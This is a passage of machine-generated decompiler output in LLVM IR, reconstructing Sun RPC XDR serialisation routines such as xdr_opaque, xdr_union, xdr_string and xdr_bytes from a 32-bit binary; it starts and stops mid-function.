  %v6_80640c7 = load i32, i32* %v5_80640c7, align 4
  call void @__pseudo_call(i32 %v6_80640c7)
  %v1_80640cc = icmp eq i32 %v3_80640be, 0
  br i1 %v1_80640cc, label %dec_label_pc_80640e3, label %dec_label_pc_80640d0

dec_label_pc_80640d0:                             ; preds = %dec_label_pc_80640bc
  %v4_80640d2 = icmp eq i32 %tmp, 0
  %v1_80640d7 = icmp eq i1 %v4_80640d2, false
  %v2_80640d7 = zext i1 %v1_80640d7 to i32
  %v1_80640da = load i32, i32* %ebx.global-to-local, align 4
  %v2_80640da = inttoptr i32 %v1_80640da to i32*
  store i32 %v2_80640d7, i32* %v2_80640da, align 4
  br label %dec_label_pc_80640e5

dec_label_pc_80640e3:                             ; preds = %dec_label_pc_8064091, %dec_label_pc_80640bc
  br label %dec_label_pc_80640e5

dec_label_pc_80640e5:                             ; preds = %dec_label_pc_8064091, %dec_label_pc_80640d0, %dec_label_pc_806409d, %dec_label_pc_80640e3
  %v0_80640e9 = phi i32 [ 1, %dec_label_pc_8064091 ], [ 1, %dec_label_pc_80640d0 ], [ %v2_80640ae, %dec_label_pc_806409d ], [ 0, %dec_label_pc_80640e3 ]
  %v2_80640e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80640e8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80640e9

; uselistorder directives
  uselistorder i32 %v2_8064088, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80640e5, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80640e3, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80640ea = call i32 @__GI_xdr_long()
  ret i32 %v0_80640ea
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80640f0 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_8064100 = icmp eq i32 %tmp, 0
  br i1 %v1_8064100, label %dec_label_pc_8064189, label %dec_label_pc_8064104

dec_label_pc_8064104:                             ; preds = %entry
  %v1_8064108 = urem i32 %tmp, 4
  %v2_8064108 = icmp eq i32 %v1_8064108, 0
  br i1 %v2_8064108, label %dec_label_pc_8064113, label %dec_label_pc_806410d

dec_label_pc_806410d:                             ; preds = %dec_label_pc_8064104
  %v2_8064111 = sub nsw i32 4, %v1_8064108
  br label %dec_label_pc_8064113

dec_label_pc_8064113:                             ; preds = %dec_label_pc_8064104, %dec_label_pc_806410d
  %storemerge13 = phi i32 [ %v2_8064111, %dec_label_pc_806410d ], [ 0, %dec_label_pc_8064104 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_8064113 = inttoptr i32 %arg2 to i32*
  %v2_8064113 = load i32, i32* %v1_8064113, align 4
  %v9_8064115 = icmp eq i32 %v2_8064113, 1
  br i1 %v9_8064115, label %dec_label_pc_8064123, label %dec_label_pc_806411a

dec_label_pc_806411a:                             ; preds = %dec_label_pc_8064113
  %v5_8064115 = icmp eq i32 %v2_8064113, 0
  br i1 %v5_8064115, label %dec_label_pc_8064150, label %dec_label_pc_806411c

dec_label_pc_806411c:                             ; preds = %dec_label_pc_806411a
  %v9_806411c = icmp eq i32 %v2_8064113, 2
  %v1_806411f = icmp eq i1 %v9_806411c, false
  br i1 %v1_806411f, label %dec_label_pc_8064187, label %dec_label_pc_8064189

dec_label_pc_8064123:                             ; preds = %dec_label_pc_8064113
  %v1_8064124 = add i32 %arg2, 4
  %v2_8064124 = inttoptr i32 %v1_8064124 to i32*
  %v3_8064124 = load i32, i32* %v2_8064124, align 4
  %v5_806412a = add i32 %v3_8064124, 8
  %v6_806412a = inttoptr i32 %v5_806412a to i32*
  %v7_806412a = load i32, i32* %v6_806412a, align 4
  call void @__pseudo_call(i32 %v7_806412a)
  %v1_8064130 = icmp eq i32 %v3_8064124, 0
  br i1 %v1_8064130, label %dec_label_pc_8064187, label %dec_label_pc_8064134

dec_label_pc_8064134:                             ; preds = %dec_label_pc_8064123
  %v0_8064134 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064134 = icmp eq i32 %v0_8064134, 0
  br i1 %v1_8064134, label %dec_label_pc_8064189, label %dec_label_pc_8064138

dec_label_pc_8064138:                             ; preds = %dec_label_pc_8064134
  %v0_8064138 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064138 = add i32 %v0_8064138, 4
  %v2_8064138 = inttoptr i32 %v1_8064138 to i32*
  %v3_8064138 = load i32, i32* %v2_8064138, align 4
  %v1_806414b = add i32 %v3_8064138, 8
  br label %dec_label_pc_806417b

dec_label_pc_8064150:                             ; preds = %dec_label_pc_806411a
  %v1_8064151 = add i32 %arg2, 4
  %v2_8064151 = inttoptr i32 %v1_8064151 to i32*
  %v3_8064151 = load i32, i32* %v2_8064151, align 4
  %v5_8064157 = add i32 %v3_8064151, 12
  %v6_8064157 = inttoptr i32 %v5_8064157 to i32*
  %v7_8064157 = load i32, i32* %v6_8064157, align 4
  call void @__pseudo_call(i32 %v7_8064157)
  %v1_806415d = icmp eq i32 %v3_8064151, 0
  br i1 %v1_806415d, label %dec_label_pc_8064187, label %dec_label_pc_8064161

dec_label_pc_8064161:                             ; preds = %dec_label_pc_8064150
  %v0_8064161 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064161 = icmp eq i32 %v0_8064161, 0
  br i1 %v1_8064161, label %dec_label_pc_8064189, label %dec_label_pc_8064165

dec_label_pc_8064165:                             ; preds = %dec_label_pc_8064161
  %v0_8064165 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064165 = add i32 %v0_8064165, 4
  %v2_8064165 = inttoptr i32 %v1_8064165 to i32*
  %v3_8064165 = load i32, i32* %v2_8064165, align 4
  %v1_8064178 = add i32 %v3_8064165, 12
  br label %dec_label_pc_806417b

dec_label_pc_806417b:                             ; preds = %dec_label_pc_8064138, %dec_label_pc_8064165
  %stack_var_0.0 = phi i32 [ %v0_8064138, %dec_label_pc_8064138 ], [ %v0_8064165, %dec_label_pc_8064165 ]
  %storemerge1.in.in = phi i32 [ %v1_806414b, %dec_label_pc_8064138 ], [ %v1_8064178, %dec_label_pc_8064165 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_807c9fc.865 to i32), %dec_label_pc_8064138 ], [ ptrtoint (i32* @global_var_806e6bd.866 to i32), %dec_label_pc_8064165 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_806417c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806417c, i32* %ebx.global-to-local, align 4
  store i32 %v0_80640f0, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_8064189

dec_label_pc_8064187:                             ; preds = %dec_label_pc_8064150, %dec_label_pc_8064123, %dec_label_pc_806411c
  br label %dec_label_pc_8064189

dec_label_pc_8064189:                             ; preds = %dec_label_pc_806417b, %entry, %dec_label_pc_8064134, %dec_label_pc_8064161, %dec_label_pc_806411c, %dec_label_pc_8064187
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_8064187 ], [ %arg1, %dec_label_pc_8064134 ], [ %stack_var_0.0, %dec_label_pc_806417b ], [ %arg1, %dec_label_pc_8064161 ], [ %arg1, %dec_label_pc_806411c ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_8064187 ], [ %arg2, %dec_label_pc_8064134 ], [ %stack_var_4.0, %dec_label_pc_806417b ], [ %arg2, %dec_label_pc_8064161 ], [ %arg2, %dec_label_pc_806411c ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_8064187 ], [ 1, %dec_label_pc_8064134 ], [ 1, %dec_label_pc_806417b ], [ 1, %dec_label_pc_8064161 ], [ 1, %dec_label_pc_806411c ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8064113, { 0, 2, 1 }
  uselistorder i32 %v1_8064108, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_8064189, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_806417b, { 1, 0 }
  uselistorder label %dec_label_pc_8064113, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_806418d = load i32, i32* @ebp, align 4
  %v0_806418e = load i32, i32* @edi, align 4
  %v0_8064190 = load i32, i32* @ebx, align 4
  store i32 %v0_8064190, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* %edi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_80641ae = call i32 @xdr_enum(i32 %arg1, i32 %tmp10)
  %v1_80641b6 = icmp eq i32 %v2_80641ae, 0
  br i1 %v1_80641b6, label %dec_label_pc_8064205, label %dec_label_pc_80641ba

dec_label_pc_80641ba:                             ; preds = %entry
  %v0_80641ba = load i32, i32* %edi.global-to-local, align 4
  %v1_80641ba = inttoptr i32 %v0_80641ba to i32*
  %v2_80641ba = load i32, i32* %v1_80641ba, align 4
  %v0_80641db.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80641db23 = add i32 %v0_80641db.pre, 4
  %v2_80641db24 = inttoptr i32 %v1_80641db23 to i32*
  %v3_80641db25 = load i32, i32* %v2_80641db24, align 4
  store i32 %v3_80641db25, i32* @ecx, align 4
  %v1_80641de26 = icmp eq i32 %v3_80641db25, 0
  %v1_80641e027 = icmp eq i1 %v1_80641de26, false
  br i1 %v1_80641e027, label %dec_label_pc_80641be, label %dec_label_pc_80641e2

dec_label_pc_80641be:                             ; preds = %dec_label_pc_80641ba, %dec_label_pc_80641d8
  %v3_80641db29 = phi i32 [ %v3_80641db, %dec_label_pc_80641d8 ], [ %v3_80641db25, %dec_label_pc_80641ba ]
  %v0_80641d828 = phi i32 [ %v1_80641d8, %dec_label_pc_80641d8 ], [ %v0_80641db.pre, %dec_label_pc_80641ba ]
  %v1_80641be = inttoptr i32 %v0_80641d828 to i32*
  %v2_80641be = load i32, i32* %v1_80641be, align 4
  %v14_80641be = icmp eq i32 %v2_80641be, %v2_80641ba
  %v1_80641c0 = icmp eq i1 %v14_80641be, false
  br i1 %v1_80641c0, label %dec_label_pc_80641d8, label %dec_label_pc_80641c2

dec_label_pc_80641c2:                             ; preds = %dec_label_pc_80641be
  br label %dec_label_pc_80641fc

dec_label_pc_80641d8:                             ; preds = %dec_label_pc_80641be
  %v1_80641d8 = add i32 %v0_80641d828, 8
  store i32 %v1_80641d8, i32* %ebx.global-to-local, align 4
  %v1_80641db = add i32 %v0_80641d828, 12
  %v2_80641db = inttoptr i32 %v1_80641db to i32*
  %v3_80641db = load i32, i32* %v2_80641db, align 4
  store i32 %v3_80641db, i32* @ecx, align 4
  %v1_80641de = icmp eq i32 %v3_80641db, 0
  %v1_80641e0 = icmp eq i1 %v1_80641de, false
  br i1 %v1_80641e0, label %dec_label_pc_80641be, label %dec_label_pc_80641e2

dec_label_pc_80641e2:                             ; preds = %dec_label_pc_80641d8, %dec_label_pc_80641ba
  %v1_80641e2 = icmp eq i32 %arg5, 0
  br i1 %v1_80641e2, label %dec_label_pc_8064205, label %dec_label_pc_80641e6

dec_label_pc_80641e6:                             ; preds = %dec_label_pc_80641e2
  store i32 %arg5, i32* @ecx, align 4
  br label %dec_label_pc_80641fc

dec_label_pc_80641fc:                             ; preds = %dec_label_pc_80641c2, %dec_label_pc_80641e6
  %v0_8064203 = phi i32 [ %v3_80641db29, %dec_label_pc_80641c2 ], [ %arg5, %dec_label_pc_80641e6 ]
  %v2_80641ff = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80641ff, i32* %ebx.global-to-local, align 4
  store i32 %v0_806418e, i32* %edi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8064203)
  br label %dec_label_pc_8064205

dec_label_pc_8064205:                             ; preds = %dec_label_pc_80641e2, %entry, %dec_label_pc_80641fc
  %v2_806420a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806420a, i32* %ebx.global-to-local, align 4
  store i32 %v0_806418e, i32* @edi, align 4
  store i32 %v0_806418d, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_80641db, { 1, 2, 0 }
  uselistorder i32 %v1_80641d8, { 1, 0 }
  uselistorder i32 %v0_80641d828, { 0, 2, 1 }
  uselistorder i32 %v0_806418e, { 1, 0 }
  uselistorder void (i32)* @__pseudo_branch, { 3, 5, 6, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32)* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_8064205, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80641fc, { 1, 0 }
  uselistorder label %dec_label_pc_80641be, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp17 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_806420f = load i32, i32* @edi, align 4
  %v0_8064210 = load i32, i32* @esi, align 4
  %v0_8064211 = load i32, i32* @ebx, align 4
  store i32 %tmp17, i32* @esi, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_806421d = load i32, i32* %arg1, align 4
  store i32 %v2_806421d, i32* %eax.global-to-local, align 4
  %v1_806421f = inttoptr i32 %arg2 to i32*
  %v2_806421f = load i32, i32* %v1_806421f, align 4
  %v1_8064221 = icmp eq i32 %v2_806421d, 0
  br i1 %v1_8064221, label %dec_label_pc_8064233, label %dec_label_pc_8064225

dec_label_pc_8064225:                             ; preds = %entry
  %v9_8064225 = icmp eq i32 %v2_806421d, 2
  %v1_8064228 = icmp eq i1 %v9_8064225, false
  br i1 %v1_8064228, label %dec_label_pc_8064225.dec_label_pc_806424b_crit_edge, label %dec_label_pc_806422a

dec_label_pc_8064225.dec_label_pc_806424b_crit_edge: ; preds = %dec_label_pc_8064225
  br label %dec_label_pc_806424b

dec_label_pc_806422a:                             ; preds = %dec_label_pc_8064225
  %v1_806422a = icmp eq i32 %v2_806421f, 0
  %v1_806422c = icmp eq i1 %v1_806422a, false
  br i1 %v1_806422c, label %dec_label_pc_806423b, label %dec_label_pc_80642dd

dec_label_pc_8064233:                             ; preds = %entry
  %v1_8064233 = icmp eq i32 %v2_806421f, 0
  br i1 %v1_8064233, label %dec_label_pc_80642e4, label %dec_label_pc_806423b

dec_label_pc_806423b:                             ; preds = %dec_label_pc_8064233, %dec_label_pc_806422a
  %v5_806423e = inttoptr i32 %v2_806421f to i8*
  %v3_806423f = call i32 @strlen(i8* %v5_806423e)
  store i32 %v3_806423f, i32* %eax.global-to-local, align 4
  store i32 %v3_806423f, i32* %stack_var_-16, align 4
  %v0_8064252.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806424b

dec_label_pc_806424b:                             ; preds = %dec_label_pc_8064225.dec_label_pc_806424b_crit_edge, %dec_label_pc_806423b
  %v0_8064252 = phi i32 [ %tmp17, %dec_label_pc_8064225.dec_label_pc_806424b_crit_edge ], [ %v0_8064252.pre, %dec_label_pc_806423b ]
  %v2_806424d = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_806424d, i32* @eax, align 4
  %tmp28 = inttoptr i32 %v0_8064252 to i32*
  %v7_8064253 = call i32 @xdr_u_long(i32* %tmp28, i32 %v2_806424d)
  store i32 %v7_8064253, i32* %eax.global-to-local, align 4
  %v1_806425b = icmp eq i32 %v7_8064253, 0
  br i1 %v1_806425b, label %dec_label_pc_80642e4, label %dec_label_pc_8064263

dec_label_pc_8064263:                             ; preds = %dec_label_pc_806424b
  %v3_8064263 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_8064263, i32* %eax.global-to-local, align 4
  %v6_806426b = icmp ugt i32 %v3_8064263, %arg3
  br i1 %v6_806426b, label %dec_label_pc_80642e4, label %dec_label_pc_806426d

dec_label_pc_806426d:                             ; preds = %dec_label_pc_8064263
  %v0_806426d = load i32, i32* @esi, align 4
  %v1_806426d = inttoptr i32 %v0_806426d to i32*
  %v2_806426d = load i32, i32* %v1_806426d, align 4
  %v9_806426f = icmp eq i32 %v2_806426d, 1
  br i1 %v9_806426f, label %dec_label_pc_806427d, label %dec_label_pc_8064274

dec_label_pc_8064274:                             ; preds = %dec_label_pc_806426d
  %v5_806426f = icmp eq i32 %v2_806426d, 0
  br i1 %v5_806426f, label %dec_label_pc_80642b6, label %dec_label_pc_8064276

dec_label_pc_8064276:                             ; preds = %dec_label_pc_8064274
  %v9_8064276 = icmp eq i32 %v2_806426d, 2
  %v1_8064279 = icmp eq i1 %v9_8064276, false
  br i1 %v1_8064279, label %dec_label_pc_80642e4, label %dec_label_pc_80642c7

dec_label_pc_806427d:                             ; preds = %dec_label_pc_806426d
  %v1_806427d = add i32 %v3_8064263, 1
  %v8_806427d = icmp eq i32 %v1_806427d, 0
  store i32 %v1_806427d, i32* %eax.global-to-local, align 4
  br i1 %v8_806427d, label %dec_label_pc_80642dd, label %dec_label_pc_8064280

dec_label_pc_8064280:                             ; preds = %dec_label_pc_806427d
  %v0_8064280 = load i32, i32* @ebx, align 4
  %v1_8064280 = icmp eq i32 %v0_8064280, 0
  %v1_8064282 = icmp eq i1 %v1_8064280, false
  br i1 %v1_8064282, label %dec_label_pc_80642ae, label %dec_label_pc_8064284

dec_label_pc_8064284:                             ; preds = %dec_label_pc_8064280
  %v2_8064288 = call i32 @malloc(i32 %v1_806427d)
  store i32 %v2_8064288, i32* %eax.global-to-local, align 4
  store i32 %v2_8064288, i32* @ebx, align 4
  %v1_8064292 = load i32, i32* @edi, align 4
  %v2_8064292 = inttoptr i32 %v1_8064292 to i32*
  store i32 %v2_8064288, i32* %v2_8064292, align 4
  %v1_8064294 = icmp eq i32 %v2_8064288, 0
  %v1_8064296 = icmp eq i1 %v1_8064294, false
  br i1 %v1_8064296, label %dec_label_pc_8064284.dec_label_pc_80642ae_crit_edge, label %dec_label_pc_8064298

dec_label_pc_8064284.dec_label_pc_80642ae_crit_edge: ; preds = %dec_label_pc_8064284
  %v3_80642ae.pre = load i32, i32* %stack_var_-16, align 4
  %v0_80642b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80642ae

dec_label_pc_8064298:                             ; preds = %dec_label_pc_8064284
  %v0_806429a1 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v4_80642a5 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_806e688.867 to i32), i32 %v0_806429a1)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80642c2

dec_label_pc_80642ae:                             ; preds = %dec_label_pc_8064284.dec_label_pc_80642ae_crit_edge, %dec_label_pc_8064280
  %v0_80642b2 = phi i32 [ %v0_80642b2.pre, %dec_label_pc_8064284.dec_label_pc_80642ae_crit_edge ], [ %v0_8064280, %dec_label_pc_8064280 ]
  %v3_80642ae = phi i32 [ %v3_80642ae.pre, %dec_label_pc_8064284.dec_label_pc_80642ae_crit_edge ], [ %v3_8064263, %dec_label_pc_8064280 ]
  store i32 %v3_80642ae, i32* %eax.global-to-local, align 4
  %v2_80642b2 = add i32 %v3_80642ae, %v0_80642b2
  %v3_80642b2 = inttoptr i32 %v2_80642b2 to i8*
  store i8 0, i8* %v3_80642b2, align 1
  %v3_80642b7.pre = load i32, i32* %stack_var_-16, align 4
  %v0_80642bc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80642b6

dec_label_pc_80642b6:                             ; preds = %dec_label_pc_8064274, %dec_label_pc_80642ae
  %v0_80642bc = phi i32 [ %v0_806426d, %dec_label_pc_8064274 ], [ %v0_80642bc.pre, %dec_label_pc_80642ae ]
  %v3_80642b7 = phi i32 [ %v3_8064263, %dec_label_pc_8064274 ], [ %v3_80642b7.pre, %dec_label_pc_80642ae ]
  %v0_80642bb = load i32, i32* @ebx, align 4
  %v6_80642bd = call i32 @xdr_opaque(i32 %v0_80642bc, i32 %v0_80642bb, i32 %v3_80642b7)
  store i32 %v6_80642bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80642c2

dec_label_pc_80642c2:                             ; preds = %dec_label_pc_80642c7, %dec_label_pc_8064298, %dec_label_pc_80642b6
  %v0_80642ec.pre = phi i32 [ %v0_80642ec.pre.pre, %dec_label_pc_80642c7 ], [ 0, %dec_label_pc_8064298 ], [ %v6_80642bd, %dec_label_pc_80642b6 ]
  br label %dec_label_pc_80642e6

dec_label_pc_80642c7:                             ; preds = %dec_label_pc_8064276
  %v0_80642ca = load i32, i32* @ebx, align 4
  %v2_80642cb = call i32 @free(i32 %v0_80642ca)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_80642d5 = load i32, i32* @edi, align 4
  %v1_80642d5 = inttoptr i32 %v0_80642d5 to i32*
  store i32 0, i32* %v1_80642d5, align 4
  %v0_80642ec.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80642c2

dec_label_pc_80642dd:                             ; preds = %dec_label_pc_806422a, %dec_label_pc_806427d
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80642e6

dec_label_pc_80642e4:                             ; preds = %dec_label_pc_8064276, %dec_label_pc_8064263, %dec_label_pc_806424b, %dec_label_pc_8064233
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80642e6

dec_label_pc_80642e6:                             ; preds = %dec_label_pc_80642dd, %dec_label_pc_80642c2, %dec_label_pc_80642e4
  %v0_80642ec = phi i32 [ 1, %dec_label_pc_80642dd ], [ %v0_80642ec.pre, %dec_label_pc_80642c2 ], [ 0, %dec_label_pc_80642e4 ]
  store i32 %v0_8064211, i32* @ebx, align 4
  store i32 %v0_8064210, i32* @esi, align 4
  store i32 %v0_806420f, i32* @edi, align 4
  ret i32 %v0_80642ec

; uselistorder directives
  uselistorder i32 %v2_8064288, { 2, 1, 0, 3 }
  uselistorder i32 %v2_806426d, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80642e6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80642dd, { 1, 0 }
  uselistorder label %dec_label_pc_80642c2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80642b6, { 1, 0 }
  uselistorder label %dec_label_pc_806424b, { 1, 0 }
}

define i32 @xdr_wrapstring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_80642fa = inttoptr i32 %arg1 to i32*
  %v4_80642fa = call i32 @__GI_xdr_string(i32* %v3_80642fa, i32 %arg2, i32 -1)
  %v1_80642ff = icmp eq i32 %v4_80642fa, 0
  %v1_8064301 = icmp eq i1 %v1_80642ff, false
  %v2_8064301 = zext i1 %v1_8064301 to i32
  ret i32 %v2_8064301
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_806430b = load i32, i32* @ebp, align 4
  %v0_806430c = load i32, i32* @edi, align 4
  %v0_806430d = load i32, i32* @esi, align 4
  %v0_806430e = load i32, i32* @ebx, align 4
  store i32 %v0_806430e, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %tmp10, i32* @edi, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v7_806432b = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  %v1_8064333 = icmp eq i32 %v7_806432b, 0
  br i1 %v1_8064333, label %dec_label_pc_80643c1, label %dec_label_pc_806433b

dec_label_pc_806433b:                             ; preds = %entry
  %v0_806433b = load i32, i32* %esi.global-to-local, align 4
  %v1_806433b = inttoptr i32 %v0_806433b to i32*
  %v2_806433b = load i32, i32* %v1_806433b, align 4
  store i32 %v2_806433b, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_806433b, %arg4
  %v0_8064348.pre = load i32, i32* @edi, align 4
  %v1_8064348.phi.trans.insert = inttoptr i32 %v0_8064348.pre to i32*
  %v2_8064348.pre = load i32, i32* %v1_8064348.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_8064343, label %dec_label_pc_8064348

dec_label_pc_8064343:                             ; preds = %dec_label_pc_806433b
  %v11_8064343 = icmp eq i32 %v2_8064348.pre, 2
  %v1_8064346 = icmp eq i1 %v11_8064343, false
  br i1 %v1_8064346, label %dec_label_pc_80643c1, label %dec_label_pc_8064348

dec_label_pc_8064348:                             ; preds = %dec_label_pc_806433b, %dec_label_pc_8064343
  %v9_806434a = icmp eq i32 %v2_8064348.pre, 1
  br i1 %v9_806434a, label %dec_label_pc_8064358, label %dec_label_pc_806434f

dec_label_pc_806434f:                             ; preds = %dec_label_pc_8064348
  %v5_806434a = icmp eq i32 %v2_8064348.pre, 0
  br i1 %v5_806434a, label %dec_label_pc_806438b, label %dec_label_pc_8064351

dec_label_pc_8064351:                             ; preds = %dec_label_pc_806434f
  %v9_8064351 = icmp eq i32 %v2_8064348.pre, 2
  %v1_8064354 = icmp eq i1 %v9_8064351, false
  br i1 %v1_8064354, label %dec_label_pc_80643c1, label %dec_label_pc_80643a3

dec_label_pc_8064358:                             ; preds = %dec_label_pc_8064348
  %v1_8064358 = icmp eq i32 %v2_806433b, 0
  br i1 %v1_8064358, label %dec_label_pc_80643c5, label %dec_label_pc_806435c

dec_label_pc_806435c:                             ; preds = %dec_label_pc_8064358
  %v0_806435c = load i32, i32* @ebx, align 4
  %v1_806435c = icmp eq i32 %v0_806435c, 0
  %v1_806435e = icmp eq i1 %v1_806435c, false
  br i1 %v1_806435e, label %dec_label_pc_806438b, label %dec_label_pc_8064360

dec_label_pc_8064360:                             ; preds = %dec_label_pc_806435c
  %v2_8064364 = call i32 @malloc(i32 %v2_806433b)
  store i32 %v2_8064364, i32* @ebx, align 4
  %v1_806436e = load i32, i32* @ebp, align 4
  %v2_806436e = inttoptr i32 %v1_806436e to i32*
  store i32 %v2_8064364, i32* %v2_806436e, align 4
  %v1_8064371 = icmp eq i32 %v2_8064364, 0
  %v1_8064373 = icmp eq i1 %v1_8064371, false
  br i1 %v1_8064373, label %dec_label_pc_8064360.dec_label_pc_806438b_crit_edge, label %dec_label_pc_8064375

dec_label_pc_8064360.dec_label_pc_806438b_crit_edge: ; preds = %dec_label_pc_8064360
  %v0_8064393.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806438b

dec_label_pc_8064375:                             ; preds = %dec_label_pc_8064360
  %v0_80643771 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v4_8064382 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806e6a3.868 to i32), i32 %v0_80643771)
  br label %dec_label_pc_80643bc

dec_label_pc_806438b:                             ; preds = %dec_label_pc_8064360.dec_label_pc_806438b_crit_edge, %dec_label_pc_806435c, %dec_label_pc_806434f
  %v0_8064393 = phi i32 [ %v0_8064393.pre, %dec_label_pc_8064360.dec_label_pc_806438b_crit_edge ], [ %v0_8064348.pre, %dec_label_pc_806435c ], [ %v0_8064348.pre, %dec_label_pc_806434f ]
  %v0_806438f = load i32, i32* @ebx, align 4
  %v2_806439a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806439a, i32* @ebx, align 4
  store i32 %v0_806430d, i32* @esi, align 4
  store i32 %v0_806430c, i32* @edi, align 4
  store i32 %v0_806430b, i32* @ebp, align 4
  %v3_806439e = call i32 @xdr_opaque(i32 %v0_8064393, i32 %v0_806438f, i32 %v2_806433b)
  br label %dec_label_pc_80643a3

dec_label_pc_80643a3:                             ; preds = %dec_label_pc_8064351, %dec_label_pc_806438b
  %v0_80643a3 = load i32, i32* @ebx, align 4
  %v1_80643a3 = icmp eq i32 %v0_80643a3, 0
  br i1 %v1_80643a3, label %dec_label_pc_80643c5, label %dec_label_pc_80643a7

dec_label_pc_80643a7:                             ; preds = %dec_label_pc_80643a3
  %v2_80643ab = call i32 @free(i32 %v0_80643a3)
  %v0_80643b0 = load i32, i32* @ebp, align 4
  %v1_80643b0 = inttoptr i32 %v0_80643b0 to i32*
  store i32 0, i32* %v1_80643b0, align 4
  br label %dec_label_pc_80643bc

dec_label_pc_80643bc:                             ; preds = %dec_label_pc_8064375, %dec_label_pc_80643a7
  %storemerge = phi i32 [ 1, %dec_label_pc_80643a7 ], [ 0, %dec_label_pc_8064375 ]
  br label %dec_label_pc_80643ca

dec_label_pc_80643c1:                             ; preds = %dec_label_pc_8064351, %dec_label_pc_8064343, %entry
  br label %dec_label_pc_80643ca

dec_label_pc_80643c5:                             ; preds = %dec_label_pc_80643a3, %dec_label_pc_8064358
